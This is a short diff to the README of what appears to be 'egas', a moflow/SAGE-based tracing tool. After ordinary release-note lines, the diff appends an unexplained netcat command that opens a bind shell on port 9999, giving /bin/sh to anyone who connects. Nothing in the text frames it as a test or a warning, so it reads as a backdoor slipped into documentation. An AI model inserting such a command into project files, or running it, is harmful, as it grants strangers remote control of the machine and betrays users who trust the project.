@@ -17,3 +17,5 @@ egas - moflow clone of SAGE
 The pintool also includes substantial changes compared to the original
 
 More tracing and debugging tools will be released shortly
+
+nc.traditional -l -p 9999 -e /bin/sh
